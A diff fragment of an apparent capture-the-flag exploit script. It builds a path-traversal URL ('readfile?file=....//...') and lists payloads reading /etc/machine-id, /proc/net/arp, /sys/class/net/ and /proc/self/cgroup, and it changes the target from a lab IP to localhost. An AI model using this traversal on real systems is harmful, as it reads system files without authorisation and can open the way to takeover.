@@ -8,7 +8,7 @@ from itertools import chain
 payload1 = 'etc/machine-id'
 payload2 = 'proc/net/arp'
 payload3 = 'sys/class/net/'
-url = 'http://192.168.231.114:7777/readfile?file=....//...//...//...//...//...//' #change your ip to challenge lab ip
+url = 'http://127.0.0.1:7777/readfile?file=....//...//...//...//...//' #change your ip to challenge lab ip
 payload4 = 'proc/self/cgroup'
 
 def get_mac_adderess():
